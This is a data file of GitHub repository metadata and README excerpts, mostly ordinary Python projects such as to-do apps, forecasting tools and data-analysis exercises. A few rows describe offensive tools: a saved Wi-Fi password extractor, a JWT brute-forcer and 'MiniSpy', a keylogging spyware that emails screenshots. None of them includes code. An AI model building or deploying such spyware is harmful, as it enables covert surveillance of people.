417693053;BookAlien;https://github.com/ourSherlock/BookAlien;Python;2021-10-16T02:28:29Z;0;0;0;
417705367;Face-Mask-Detection;https://github.com/Shijia003/Face-Mask-Detection;Jupyter Notebook;2021-10-16T03:36:17Z;0;0;0;MH4510-Face-Mask-Detection Face mask detecting with artificial intelligence using Python 
417714847;pulumidon;https://github.com/etothexipi/pulumidon;;2021-10-16T04:26:46Z;0;0;0;pulumidon Deploy Mastodon social network on Linode via Pulumi (Python) 
417698360;steal-the-spotlight;https://github.com/monster1612/steal-the-spotlight;;2021-10-16T02:57:17Z;0;0;0;
417736774;EDA;https://github.com/kjgururaj/EDA;HTML;2021-10-16T06:15:02Z;0;0;0;EDA Perform Exploratory Data Analysis using numpy, Pandas and Visualisation techniques The data is for customers of the treadmill product(s) of a retail store called Cardio Good Fitness. It contains the following variables Product - the model no. of the treadmill  Age - in no of years, of the customer Gender - of the customer Education - in no. of years, of the customer Marital Status - of the customer Usage - Avg. # times the customer wants to use the treadmill every week Fitness - Self rated fitness score of the customer (5 - very fit, 1 - very unfit) Income - of the customer Miles- expected to run Explore the dataset to identify differences between customers of each product. You can also explore relationships between the different attributes of customers. You can approach it from any other line of questioning that you feel could be relevant for the business. 
417698969;prueba1;https://github.com/tonysand/prueba1;;2021-10-16T03:00:38Z;0;0;0;prueba1 Pruebas para web programming con python y js 
417677354;face-blocker;https://github.com/pixelatedCorn/face-blocker;Python;2021-10-16T00:55:14Z;1;1;0;Readme This is a small program I threw together in about 6 hours to block out your face. It probably doesn't work very well, so be warned. By default, the program will use a green rectangle to block out your face and show the result in a window. The 'b' key can be used to toggle the blocking functionality in case you want to do that for some reason. Syntax py -3 src/main.py [options]  -h, --help             Display the help menu -v, --verbose          Run the program in verbose mode -i, --image [path]     Block out faces with an image instead of a green rectangle -w, --hide-window      Run the program without display output to a window -c, --camera           Outputs the program to a virtual camera  Deps  opencv2 numpy (Only required if you want to use the -i and -c flags) pyvirtualcam  (Only required if you want to use the -c flag)  
417718312;Airport-management-;https://github.com/AnshumanTripathy123/Airport-management-;Jupyter Notebook;2021-10-16T04:43:28Z;0;0;0;Airport-management- Very basic management system with python and mySQL. THe project runs in the terminal, currently it does not have any GUI interface. The project stores the information in the mysql database and extracts data from the database. Prerequisites - Python Jupyter Notebook for ipynb file. mySQL mySQL connector Feel free to check and contribute. Thank You. 
417755601;FastUnZip;https://github.com/imkarimkarim/FastUnZip;Python;2021-10-16T07:38:33Z;0;0;0;FastUnZip an API that unzips your archive files 
417752886;vltava-scraper;https://github.com/squeaky-godzilla/vltava-scraper;Python;2021-10-16T07:25:52Z;0;0;0;vltava-scraper Script that scrapes Vltava Rozhlas audio-player page and downloads the referenced mp3 files. It is using the BeautifulSoup scraping framework. how to run  use a container specified in .devcontainer folder OR use the requirements.txt to install via pip OR use poetry package manager  usage python vltava-scraper.py -url https://vltava.rozhlas.cz/roman-raz-benda-zatrhne-aneb-hrdina-serialu-hrusinsky-a-stasova-v-povedene-8593177  
417749078;ComputerUtilization;https://github.com/x444556/ComputerUtilization;Python;2021-10-16T07:08:38Z;0;0;0;ComputerUtilization Displays CPU, RAM and disk usage. 
417699101;DoraPy;https://github.com/CPG123456/DoraPy;Python;2021-10-16T03:01:08Z;0;0;0;DoraPy Dorapy is a deep learning framework that focuses on data preprocessing.🛸 
417687887;webprogrammingCS50;https://github.com/dqkhai4274/webprogrammingCS50;HTML;2021-10-16T02:00:10Z;0;0;0;CS50's web programming with Python and Javascript Projects from course CS50's web programming with Python and Javascript of Harvard university Project 0: Build Google search from scratch with HTML/CSS and Javascript How to start ?  Download project 0 and then open index.html using your browser  Project 1: Project 2: 
417732023;xiaoliang;https://github.com/ruiruiandliangliang/xiaoliang;;2021-10-16T05:50:52Z;0;0;0;xiaoliang i want to learn more something about mimic, python,mysql,and so on python 
417736047;Jarvise_Al-;https://github.com/vivek32111111/Jarvise_Al-;Python;2021-10-16T06:11:28Z;0;0;0;
417733496;SOP_perception;https://github.com/chgmqh/SOP_perception;Python;2021-10-16T06:00:21Z;0;0;0;SOP_perception this is a signal perception software based on labview, PYTHON. The target signals are Wifi, bluetooth and zigbee. 1：Please place this folder in the D:\Project\labview\202105\  directory to run correctly . 2：To quickly load the preset parameters, you can use the LOAD button at the bottom right corner of the panel. 3：Running configuration requirements: win10 x64-bit operating system, python3.8, labview2020, and drivers required to use USRP (please refer to https://www.ettus.com/all-products/ub210-kit/ for installation instructions). 4：Make sure all the imports in Python\main_ClassifyOnly.py have been installed on the computer (do not use anaconda to install). 
417720779;Snake-Game;https://github.com/anthonytoribio/Snake-Game;Python;2021-10-16T04:57:20Z;0;0;0;Snake-Game A recreation of the popular game, Snake, using Python and the Pygame Library. The game lives in the file snake_game.py 
417712969;wifi-password-extractor;https://github.com/nomanahmedna/wifi-password-extractor;Python;2021-10-16T04:15:36Z;0;0;0;wifi-password-extractor this is the script in python to extract all the saved wifi passwords from system. 
417698911;Chronozone;https://github.com/Chronozone/Chronozone;;2021-10-16T03:00:21Z;0;0;0;Chronozone New and in development language with python as its backend language 
417687445;ManagedParameterClass;https://github.com/BenEgeIzmirli/ManagedParameterClass;;2021-10-16T01:57:22Z;0;0;0;
417694089;TDDbyNestor;https://github.com/Nestor-Rs/TDDbyNestor;HTML;2021-10-16T02:34:59Z;0;0;0;
417710978;Movie-Analytics;https://github.com/possomartin/Movie-Analytics;;2021-10-16T04:05:12Z;0;0;0;
417729493;Phothon;https://github.com/SHinGo-Koba/Phothon;Python;2021-10-16T05:37:48Z;0;0;0;Phothon pythonで画像をあれこれする 
417671205;api-synthese;https://github.com/camara94/api-synthese;Python;2021-10-16T00:14:04Z;0;0;0;"Création API REST en Python Dans ce tuto, nous allons réaliser une API RESTFULL en qui va exploiter notre algorithme de synthèse automatique que nous avons réalisé dans les tuto précédents. Installer Python Si vous avez pas python, pouvez l'installer à travers ce lien. Je vous recommande la version 3.x.x surtout. Sous Windows, cliquez sur l'icône du menu Démarrer et tapez cmd dans la zone de recherche, puis appuyez sur Entrée. Une fois votre ligne de commande ouverte, saisissez ces commandes :      python --version     pip --version   Si la sortie de ces commandes inclut un numéro de version, Python est installé et disponible à partir de la ligne de commande et vous pouvez passer à l'étape suivante. Installer flask      pip install flask --user   Créer un projet Sous Windows, vous pouvez créer le dossier api avec ces commandes dans votre environnement de ligne de commande cmd :      md api     cd api   Installer  flask-cors      pip install -U flask-cors   Ensuite, ouvrez un éditeur de texte (tel que VSCODE ou Notepad++), créer un fichier api.py et entrez le code suivant : Importer les packages suivants      import flask     from flask import request, jsonify     from synthese import *     from flask_cors import CORS, cross_origin   Créer un endpoint Cet endpoint, va me permettre de prendre l'URL d'un article retourner l'article et son résumé.  @app.route('/api', methods=['GET']) @cross_origin() def api_url():     # Check if an URL was provided as part of the URL.     # If URL is provided, assign it to a variable.     # If no URL is provided, display an error in the browser.     if 'url' in request.args:         url = str(request.args['url'])         return synthese_automatique(url)     else:         return ""Error: No id field provided. Please specify an url.""   Exécuter      python api.py   Demo  Appelle de notre à travers l'objet XMLHttpRequest      <script>             var bouton = document.getElementById('btn');             bouton.addEventListener( 'click', (e) => {                 var param = document.getElementById('url').value;                 getContent(param);             } );             const getContent = (param)  => {                 var url = ""http://127.0.0.1:5000/api?url="" + param;                 var oReq = new XMLHttpRequest();                 var div = document.getElementById('load');                 var image = document.createElement('img')                 oReq.addEventListener('progress', (e) => {                     image.setAttribute('src', 'loading-buffering.gif');                     div.appendChild(image);                 })                 oReq.addEventListener(""load"", () => {                         var reponse = document.getElementById('reponse');                         var article = document.getElementById('article');                         reponse.innerHTML="""";                         article.innerHTML=""""                         if (oReq.status != 200) { // analyze HTTP status of the response                             alert(`Error ${oReq.status}: ${oReq.statusText}`); // e.g. 404: Not Found                         } else { // show the result                             //alert(`Done, got ${oReq.responseText} bytes`);                             var rep = JSON.parse(oReq.responseText);                            setTimeout(()=>{                             div.removeChild(image)                            }, 2000);                             var titre = document.createElement('h3');                             titre.style.margin = '0px auto';                             var titreText = document.createTextNode('Le résumé de l\'article');                             titre.appendChild(titreText);                             var para = document.createElement('p');                             var parText = document.createTextNode(rep.resume);                             para.appendChild(parText);                             var titre2 = document.createElement('h3');                             titre2.style.margin = '0px auto';                             var titreText2 = document.createTextNode('L\'article original');                             titre2.appendChild(titreText2);                             var para2 = document.createElement('p');                             var parText2 = document.createTextNode(rep.article);                             para2.appendChild(parText2);                             reponse.appendChild(titre);                             reponse.appendChild(para);                             article.appendChild(titre2);                             article.appendChild(para2);                         }                     }                 );                 oReq.open(""GET"", url);                 oReq.send()             }     </script>   "
417675007;NeoSpecter;https://github.com/ridge-runner/NeoSpecter;Python;2021-10-16T00:40:01Z;0;0;0;NeoSpecter A Python script that inputs Excel data into the NeoSerra CRM. Libraries Used  Openpyxl to drive Excel. Selenium webdriver to fill-in web forms. Pandas may be used if Openpyxl is unable to perform as required. tkinter for GUI. Script bundled into .exe for easy use on Windows OS.  User Experience  User opens NeoSpector.exe. GUI loads. Shows user a folder picker widget. User clicks on folder picker and selects folder containing excel files with client award data. User clicks SELECT FOLDER BUTTON. User clicks LOAD EXCEL FILES BUTTON on GUI. Progress bar appears. Excel files are loaded. Success or failure status is displayed in pop-up. If successful, User clicks RUN SPECTOR BUTTON to activate Selenium. A warning message shown telling the user to not use their mouse or keyboard while Spector is running. User clicks OK BUTTON. Pop-up closes. Progress bar is shown. Selenium activates. Web browser is opened and navigates to NEO SERRA CRM LOGIN. LOG IN credintials are entered. Selenium navigates to AWARDS PAGE. clicks new award. Copies data from the Excel sheets and enters it into the Neo Serra Webforms. Typing simulation is a nice add-on. Webform is saved. Selenium repeats steps 13-16 until all of the excel data has been entered. Spector shows dialogue box showing that the operation is successful. User is returned to home screen.  Process list With PANDAS  Client excel data and client awards data is collected into PANDAS. THIS IS ALL PUBLIC INFORMATION. PANDAS array is used as the data source for the webdriver.  Misc. Features   Config file A simple configuration file/module will be used to set the script parameters. These parameters will be set using the tkinter GUI or by manually changing the file.   Interactive instructions A manual to help orient new users in how to use the program.   Ghost Icon used as mascot   ERRORS NeoSpecter is rigid in that it relies on the Excel data formats and the NeoSerra webforms to remain the same over time. If the formating is changed with the excel datafile exports from EVA or NeoSerra changes the XPATH of their awards webform, the program will break. 
417670936;atvss-obavestenja;https://github.com/dedavlade/atvss-obavestenja;Python;2021-10-16T00:12:39Z;0;0;0;atvss-info 
417722402;node1;https://github.com/AmerAdilny/node1;;2021-10-16T05:04:35Z;0;0;0;node1 Game Devloment request python/node.js to edit file/ -npm clone ava1 
417744795;file_actions;https://github.com/Naveen-NS67/file_actions;Python;2021-10-16T06:50:57Z;0;0;0;
417738974;Pandas-clone;https://github.com/saptarshi98/Pandas-clone;Python;2021-10-16T06:25:05Z;0;0;0;
417696201;G-s_api211016;https://github.com/hamasaki-tadashi/G-s_api211016;Jupyter Notebook;2021-10-16T02:45:52Z;0;0;0;pythonを使って、リアルタイムの姿勢推定の表示 自主制作アプリ(python)  APIの課題は「外部のデータ、コードを活用して自身のサプリに生かす」ことだと捉えpythonで取り組む pythonの環境がなくても使えるGoogle Colaboratory（グーグル・コラボラトリー）で作成 上から順番に実行ボタンを押していくと、システムが動き、最終的にPCのカメラでリアルタイムに姿勢推定ができる ※中には、エラーが出るコードをそのままにしているため実行しないものもある（なぜエラーが出るのか分析中） 姿勢推定のデータ取得、構築はGithubに乗せてくれているものを拝借 https://colab.research.google.com/drive/1UCQK9LbjVP7V4qUobVDHRtJp-JlDMuxP?usp=sharing  課題  自分が作りたいプロダクトでは、姿勢推定した各部位のデータを取得することが必要 今後の取り組みとして、「姿勢推定した棒人間を記録・保存」「別々の棒人間を同時に表示し比較」 外部のライブラリ、モジュールを使って理論が把握できていないため、基礎から機械学習を理解し実装 『ゼロから作るDeep Learning』の読破、コードを書いて理解する  
417710690;lru_cache;https://github.com/jhuno137/lru_cache;Python;2021-10-16T04:03:56Z;0;0;0;"LRUCache Documentation (Linux/OS X) Using the LRU cache From the root of the project (see main.py as a concrete example) import LRUCache: from cache.lru import LRUCache  cache = LRUCache(5)                 # instantiate a cache instance of capacity 5 cache.put(""foo"", ""bar"")             # add an element to the cache cache.put(""secret"", 1234) cache.put(""user_id"", 789) cache.get(""secret"")                 # read and element from the cache cache.put(""cookie"", ""prov=uc670a3f-79ec-44e6-f1fc-fc5c65c3d48c;"") cache.put(""token"", ""AK3G5676TANGF098ZQ"") cache.put(""form_color"", ""#fcaad1"")  # exeding cache capacity cache.get(""foo"")                    # None as item was at the end of the cache cache.delete(""cookie"")              # delete an element from the cache cache.reset()                       # clear cache The public API:  put(key, value): adds a new element to the cache get(key): get a key vale from the cache, or None on miss delete(key): delete an element from the cache if exists, otherwise nothing happens (method is idempotent) reset(): clears the cache by removing all elements from it  Run the tests Within the project root directory run: export PYTHONPATH=$(pwd) && python3 tests/lru_cache_tests.py  "
417742150;parsecGraphite;https://github.com/LATINO-BICEPS/parsecGraphite;Python;2021-10-16T06:38:50Z;0;0;0;What is this?  This is a Python script that will send the current status of Parsec on the computer that it is installed on set to run every 5 seconds. Installation Run parse.py in C:\ProgramData\Parsec where the log.txt file resides. Modify the IP address as necessary. Make a shortcut to run on startup inside of shell:startup. In the panel settings, set Connect null values to always to cover up the missing points when you initially connect to the host. A sample dashboard sampleGrafanaDash.json has been included. Simply import it directly into Grafana. Limitations As it is run on the same machine as the Parsec host, it will only be able to send data when it is online. When the host is shutdown, there will be null fields that Grafana cannot make a graph with - creating an air gap between data:  My bandaid solution for the time being is to run a simple ping script, locally on the Graphite server, that is run every 5 seconds that will set each record to 0 if the Parsec host is offline. A more ideal solution would be to run the script entirely on the Graphite server mounting the C:\ProgramData\Parsec via SMB/CIFS to avoid the mess of running 2 different scripts doing the same thing.  
417714925;inovacao-afro-cartorios;https://github.com/robsonfs/inovacao-afro-cartorios;Python;2021-10-16T04:27:08Z;0;0;1;Projeto Final - Inova.Ação Afro (C.E.S.A.R / Share RH) Sobre o Inova.Ação Afro É um programa de formação e capacitação desenvolvido entre a Share RH e o CESAR A iniciativa oferecerá 84h de imersão na linguagem de programação Python e, ao final das aulas, será realizado um processo seletivo para vagas no CESAR. Leia mais Setup com docker  Garanta que o Docker e o Docker Compose estão instalados em seu ambiente Na raiz do projeto, execute os seguintes comandos  docker-compose run --rm app python manage.py createsuperuser # Para criar um superusuário docker-compose run --rm app python manage.py populate_db # Para pré-popular o banco de dados com dados iniciais de cartórios Brasileiros Setup sem docker  Você deve ter o Python 3.8 instalado configurado em seu ambiente Instale e configure o PostgreSQL 13: Linux | Windows | MacOS Edite o arquivo config/settings.py e re-escreva a config DATABASES de acordo com as configurações do seu banco de dados Na raiz do projeto, execute os segintes comandos:  python manage.py createsuperuser # Para criar um superusuário python manage.py populate_db # Para pré-popular o banco de dados com dados iniciais de cartórios Brasileiros Desafio  Registre os modelos cartorios, adressess e contact_information no Django Admin Implemente os seguintes endpoints:     Endpoint Método Ação     /cartorios GET Retorna lista de cartórios paginadas de 50 em 50   /cartorios/{uf} GET Retorna a lista de cartórios da UF paginadas de 50 em 50   /cartorios/{id} GET Retorna os detalhes de um cartório   /cartorios POST Adiciona um novo cartório à base de dados   /cartorios/{id} PUT Atualização completa de um cartório   /cartorios/{id} PATCH Atualização Parcial de um cartório   /cartorios/{id} DELETE Remove um cartório da base de dados    
417679635;sparkifydb_pg;https://github.com/sunnykan/sparkifydb_pg;Jupyter Notebook;2021-10-16T01:08:31Z;0;0;0;Project Summary Analyze data on songs and user activity on a music streaming app to understand what music users are listening to on the service. Design a database schema to facilitate the analysis. User activity and metadata on songs are recorded in separate JSON files which are kept in separate directories. Create an ETL pipeline to populate the new Postgres database using data from these files in the two directories. The database uses a star schema with a fact table and several dimension tables. Execution Clone the project and run the following commands in order:  To connect to the database and create the tables, run python sparkifydb_pg/create_tables.py To populate the tables, run python sparkifydb_pg/etl.py Query the database  Files sql_queries.py: Contains all relevant queries that are used for creating tables and inserting data. create_tables.py: Creates the database and the constituent tables. etl.py: Parses the data files, transforms the data and populates the tables in the database. 
417708471;StatisticsApps;https://github.com/kygm/StatisticsApps;Python;2021-10-16T03:53:07Z;0;0;0;
417714131;Log-to-Text-or-Json;https://github.com/aldiariq/Log-to-Text-or-Json;Python;2021-10-16T04:22:21Z;0;0;0;Log-to-Text-or-Json 
417692866;utopia_flask_populateDB-Chuy;https://github.com/Heads-in-the-Cloud/utopia_flask_populateDB-Chuy;;2021-10-16T02:27:16Z;0;0;0;
417705521;CEEMDAN_LSTM;https://github.com/FateMurphy/CEEMDAN_LSTM;Jupyter Notebook;2021-10-16T03:37:17Z;0;0;0;"CEEMDAN_LSTM Background CEEMDAN_LSTM is a Python project for decomposition-integration forecasting models based on EMD methods and LSTM. It is a relatively imperfect module but beginners can quickly use it to make a decomposition-integration prediction by CEEMDAN, Complete Ensemble Empirical Mode Decomposition with Adaptive Noise (Torres et al. 2011), and LSTM, Long Short-Term Memory recurrent neural network (Hochreiter and Schmidhuber, 1997). If you use or refer to the content of this project, please cite paper: ""Zhou, F. T. (2021). Carbon price forecasting based on CEEMDAN and LSTM. Unpublished now."" Flowchart  Install First, download CEEMDAN_LSTM.py to your computer, and create a new file that can run python. If you can use Jupyter, you can directly download CEEMDAN LSTM of CarbonPrice.ipynb at the same time and follow the steps inside to complete the prediction. import CEEMDAN_LSTM as cl If an error occurs, please check the modules that need to be installed. Note if the error is that pyemd does not exist, please install EMD-signal rather than pyemd module. pip install datetime pip install EMD-signal # pyemd pip install vmdpy pip install sampen pip install tensorflow==2.5.0 Preparation Help or Example You can use the code to call for a guideline or help. It is not recommended to use cl.run_exmaple() because the integration way by sample entropy is not the same every time. cl.guideline() cl.guideline_vars() cl.example() Declare the path Determine folders to store datasets and output results. The folder will be created automatically when the code is run for the first time. Please download cl_sample_dataset.csv and put it into the declared folder. If it runs successfully, the program will display a picture of the series. The default dataset saving path: D:\CEEMDAN_LSTM\ The default figures saving path: D:\CEEMDAN_LSTM\figures\ The default logs and output saving path: D:\CEEMDAN_LSTM\subset\ The default dataset name: cl_sample_dataset (must be csv file) series = cl.declare_path() If you want to use anthor folders, you can use cl.declare_path(path="""",figure_path="""",log_path="""",dataset_name="""") (must be csv file). If you want to use your own data, you can use cl.declare_path(series=pd.Series) (must be pd.Series). Start to predict 0. Statistical tests (not necessary) The code will ouput the reuslt of ADF test, Ljung-Box Test, Jarque-Bera Test, and plot ACF and PACF figures. cl.statistical_tests() 1. Declare mode and variables Importantly!, you need to declare decomposition mode and global variables.It is recommended to declare variables first every time you predict or decompose and other operations. Default value: mode='ceemdan', Mainly determine the decomposition method form='', Integration form only effective after integration data_back=30, The number of previous days related to today periods=100, The length of the days to forecast epochs=100, LSTM epochs patience=10, Patience of adaptive learning rate and early stop, suggesting epochs/10 cl.declare_vars() 2. Decomposition and Integration Choose a method to decompose the original data from mode='emd', mode='eemd', or mode='ceemdan' by cl.declare_vars(mode=''). imfs = cl.emd_decom() Calculate sample entropy cl.sample_entropy() Integrate subsequences, where form represents the integration way. form = [[0,1],[2,3,4],[5,6,7]] cl.integrate(inte_form=form)  3. Forecast Before forecasting, it is recommended to redeclare the variables. Variable form you can get from integration. There are many methods to choose, including single, ensemble, respective, hybrid, and mutiple. cl.declare_vars(mode='ceemdan',form='233',epochs=100) #  cl.Single_LSTM() You can try other methods cl.Single_LSTM(draw=False,show_model=False) cl.Ensemble_LSTM() cl.Hybrid_LSTM() cl.Multi_pred(run_times=10,ensemble_lstm=True,respective_lstm=True) 4. Re-decomposition After the first decomposition above, some sub-sequences are still difficult to predict, so they can be decomposed again. df_redecom = cl.re_decom(redecom_mode='vmd',redecom_list=[0])  df_input['sum'] = series.values cl.Ensemble_LSTM(df=df_redecom,show_model=False) For hybrid models, you can directly add parameters redecom='vmd'. cl.Hybrid_LSTM(redecom='vmd') An example of BeijingETS.csv Hybrid method df_bjETS = pd.read_csv(PATH+'data\\BeijingETS.csv',header=0,parse_dates=[""date""],                        date_parser=lambda x: datetime.strptime(x, ""%Y%m%d"")) series_bj = pd.Series(df_bjETS['close'].values,index = df_bjETS['date']).sort_index().astype(float) cl.declare_vars(mode='ceemdan') ceemdan_bj = cl.emd_decom(series=series_bj) cl.sample_entropy(imfs_df=ceemdan_bj) inte_bj = cl.integrate(df=ceemdan_bj,inte_form=[[0,1],[2,3],[4,5],[6,7,8]]) # form may not be the same every time cl.declare_vars(mode='ceemdan_se',form='233',epochs=10) cl.Hybrid_LSTM(df=inte_bj,redecom='vmd') Time-saving method df_bjETS = pd.read_csv(PATH+'data\\BeijingETS.csv',header=0,parse_dates=[""date""],                        date_parser=lambda x: datetime.strptime(x, ""%Y%m%d"")) series_bj = pd.Series(df_bjETS['close'].values,index = df_bjETS['date']).sort_index().astype(float) cl.declare_vars(mode='ceemdan',epochs=1000) ceemdan_bj = cl.emd_decom(series=series_bj) df_vmd_bj = cl.re_decom(df=ceemdan_bj,redecom_mode='vmd',redecom_list=0)  cl.Ensemble_LSTM(df=df_vmd_bj) Predict the next day Set next_pred for cl.Hybrid_LSTM(next_pred=True). cl.Hybrid_LSTM(next_pred=True) or you can try time saving method by cl.run_predict() cl.run_predict(series=series,epochs=1000) Postscript If you have any questions, please leave your comment or email me. "
417724484;a-nikola-site;https://github.com/tangyiming/a-nikola-site;Python;2021-10-16T05:14:29Z;0;0;0; 本博客样式修改自网站 https://mosquitto.org/ 的网站代码  用途 本项目适合使用Python栈的同学建立个人博客，或作为产品主页使用。 样式 整体样式可以参考我贡献的smqtt产品主页，代码库：https://github.com/tangyiming/smqtt-site/tree/src  使用文档 https://getnikola.com/# 安装构建 install Nikola https://getnikola.com/getting-started.html#install build excute nikola build and checkout the output directory. github 自动构建 https://getnikola.com/blog/automating-nikola-rebuilds-with-github-actions.html CNAME 需修改 files/CNAME 文件内容为你自己的域名 
417730672;DockerDev-ReadCsv2Excel;https://github.com/sobadrush/DockerDev-ReadCsv2Excel;Python;2021-10-16T05:44:16Z;0;0;0;   參考 連結     Python PIP 使用 requirements.txt 管理套件相依性 https://blog.longwin.com.tw/2019/03/python-pip-requirements-txt-management-package-2019/   【Python】使用 PyInstaller 將 Python打包成 exe 檔 https://medium.com/pyladies-taiwan/python-%E5%B0%87python%E6%89%93%E5%8C%85%E6%88%90exe%E6%AA%94-32a4bacbe351    注意：不可用 Python3.10版(有lib pip安裝不到)  可使用docker虛擬python環境 open this folder 安裝套件: pip install -r ./requirements.txt 輸出exe:  pyinstaller.exe -F .\ReadCsv2Excel_xlsxwriter.py 要讀取的原始檔: sample.txt  
417711469;ToDoApp;https://github.com/AadiVishwakarma/ToDoApp;HTML;2021-10-16T04:07:47Z;0;0;0;ToDoApp A web based simple note or task taking app designed using python framework and deployed on heroku. Reuirements: click==8.0.1 colorama==0.4.4 Flask==2.0.2 Flask-SQLAlchemy==2.5.1 greenlet==1.1.2 gunicorn==20.1.0 itsdangerous==2.0.1 Jinja2==3.0.2 MarkupSafe==2.0.1 SQLAlchemy==1.4.25 Werkzeug==2.0.2 
417712781;ScanFold_Oligo_Metric;https://github.com/wbrouse/ScanFold_Oligo_Metric;Python;2021-10-16T04:14:32Z;0;0;0;ScanFold_Oligo_Metric This ReadMe file contains information on inputs needed to run the script and the data contained in the output files from the ScanFold_Oligo_Metrics.py script. This script was written in Python 3.8 to parse through ScanFold output data in tiled 18nt windows to determine metrics associated with potential ASOs. The input files required to run this script are the FinalPartners.txt file, the input fasta file of the gene sequence, and the ScanFold.log file To run the script you will type the following: python simple_oligo_metrics.py  FinalPartners.txt  Sequence.fasta  ScanFold.log  Outfile  IntegerWindowSize SequenceID Here the input files names you enter will be the exact name of your file, the Outfile will be a name you decide, IntegerWindowSize will be 18, and SequenceID is the Mul_RS..... name The output file of the scripts reports the average of average z-scores, average MFEs, and average EDs for the tiled user defined window, the total number of base pairs in the ScanFold predicted model for each tiled window, the number of possible base pairs per nucleotide for all nucleotides in the tiled user defined window according the ScanFold-Scan results, the reverse complement of the sequence in the tiled user defined window, the range of nucleotides being analyzed in the tiled window, and the sequence ID of the input. The columns of data in the output file are as follows for each user defined window:  avgZscore avgMFE avgED #ofBPs pos1BP/nt pos2BP/nt pos3BP/nt pos4BP/nt pos5BP/nt pos6BP/nt pos7BP/nt pos8BP/nt pos9BP/nt pos10BP/nt pos11BP/nt pos12BP/nt pos13BP/nt pos14BP/nt pos15BP/nt pos16BP/nt pos17BP/nt pos18BP/nt Reverse Complement ntRange TranscriptID  Below are the definition of each value type. avgzscore: Average of the average z-scores across the tile user defined window. avgMFE: Average of the average minimum free energies across the tiled user defined window. avgED: Average of the average ensemble diversities across the tiled user defined window. #ofBP: The number of total base pairs in the tiled user defined window according the to final ScanFold predicted model. pos#BP/nt: The number of possible base pairs each nucleotide in the user defined window was predicted to make according to ScanFold-Scan. Reverse Complement: The reverse complement of the sequence in the tiled user defined window. Included for ease of identifying siRNA seed sequences. ntRange: The range of nucleotides being analyzed in each window SequenceID: Transcript ID associated with each data window. This is included for ease of analysis when multiple files are concatenated into one larger file. 
417671551;TurtLSystems;https://github.com/discretegames/TurtLSystems;Python;2021-10-16T00:16:08Z;0;0;0;TurtLSystems todo  quick desc how to install examples  
417758816;Histogramas;https://github.com/Aquapy/Histogramas;;2021-10-16T07:54:53Z;0;0;0;Histogramas En este repositorio, se guardarán los archivos necesarios para realizar aprender a realizar histogramas y tablas de frecuencia en Python 
417752422;TodoApp-Flask;https://github.com/udaychugh/TodoApp-Flask;HTML;2021-10-16T07:23:41Z;0;0;0;TodoApp-Flask A simple Todo app using Flask and SQLite Database Setup & Installtion Make sure you have the latest version of Python installed. git clone https://github.com/udaychugh/TodoApp-Flask.git pip install -r requirements.txt Running The App python app.py Viewing The App Go to http://127.0.0.1:8000 
417707401;annotater;https://github.com/ashwani-rathee/annotater;Jupyter Notebook;2021-10-16T03:47:47Z;0;0;0;Annotater tool for Brain Tumor, submission for mhacks'21 Plan of Action:  
417758098;For-Contributor;https://github.com/Ayushi1309/For-Contributor;;2021-10-16T07:51:07Z;0;0;0;
417759359;jwt-bf;https://github.com/ivan-sincek/jwt-bf;Python;2021-10-16T07:57:22Z;1;1;0;JWT BF Brute force a JWT token. Script uses multithreading. Tested on Kali Linux v2021.4 (64-bit). Made for educational purposes. I hope it will help! How to Run Open your preferred console from /src/ and run the commands shown below. Install required packages: pip3 install -r requirements.txt  Run the script: python3 jwt_bf.py  Images  Figure 1 - Help  Figure 2 - Cracking 
417699954;Tech-Eye;https://github.com/munal0803/Tech-Eye;Python;2021-10-16T03:05:41Z;0;0;0;"GuidEye A python software that can help blind people find things like laptops, phones, etc the same way a guide dog guides a blind person in finding his way. The problem GuidEye solves Consider a scenario. A blind person is alone at home and needs something like he wants to find his movable chair but has forgotten where it was placed. Normally he would have to guess the direction and try by reaching out to the distances if there is no one to help. In this case he would have to waste a lot of energy and time and there is also a risk of them hurting or wounding themselves in the process. Our project solves this problem. A person using this would simply open this project, it would ask him what he wants and he would simply say ""chair"", the project would detect and start searching for the chair with the help of machine learning item detection using the camera of the device. The person then would have to simply rotate and would try to find the chair using his phone. As soon as the software detects a chair, it calls out just like a metal detector beeps. Following this sound, the person can find the object he wants (in this case a chair) and reach to it with ease. Thus, this software acts like a guide dog helping out a blind person Challenges we ran into Challenges we ran into while coming up and implementing this project :  We wanted to solve a problem for blind people but were confused how could we do it. After coming up with this idea voice recognition and speaker acted as a small problem but was resolved. Training a model for detecting posed a problem. After this, coming up with a way of transferring and connecting a phone to the software  Technologies used 1.TensorFlow 2.OpenCV 3.PythonSpeech 4.RecognitionText-to-Speech 5.SSD "
417723966;Practice-Programming;https://github.com/Albtony/Practice-Programming;C++;2021-10-16T05:11:56Z;0;0;0;
417756656;MiniSpy;https://github.com/tirelesslearner-1901/MiniSpy;Python;2021-10-16T07:44:00Z;0;0;0;MiniSpy    A Python based spyware application able to monitor one's keyboard , gather system information and sending screenshots remotely via automated mail.  
417747787;Zora;https://github.com/SxNade/Zora;Python;2021-10-16T07:03:26Z;1;1;0;Zora    Zora is a python program that searches for GeoLocation info for given CIDR networks , with options to search with API or without API Installing and Running Zora $ git clone https://github.com/SxNade/Zora $ cd Zora $ chmod +x zora  $ ./zora --help Zora Options Listing Help $ ./zora --help Specifying File containing Networks in CIDR or Single IP addresses $ ./zora --file /path/to/file.txt Note: The File must contain only one network at each line with API or Without API with API, Note that this will look for API key in api.txt File in current Directory, reads only the very First line! Get Your API Key $ ./zora --file cidr_networks.txt --api=1 without API Note: The Info Found without using API might not be accurate and detailed as the API ones $ ./zora --file cidr_networks.txt --api=0 Local Storage of Data Note: Only the Data Found using API is stored locally in the Data Directory in JSON Format whenever you rerun the program, it also checks for the presence of corresponding json in the data directory and if its found the results are displayed from the local storage Demo  Future Updates Note: A Major update of utilizing online APIs for free / without any key etc.. will be added soon 
417679440;ANN-implementation-of-MNIST-dataset;https://github.com/IRekik/ANN-implementation-of-MNIST-dataset;Python;2021-10-16T01:07:16Z;0;0;0;
417710272;Downloader-MP3-0.0.5-;https://github.com/luismudder/Downloader-MP3-0.0.5-;Python;2021-10-16T04:01:58Z;1;1;0;
417743594;DNA2PROTEIN;https://github.com/nikhil-somani/DNA2PROTEIN;Python;2021-10-16T06:45:48Z;0;0;0;PROTEINSYNTHESIS This is a python program that converts a given dna string to rna to protein and return the list of protein to the user. 
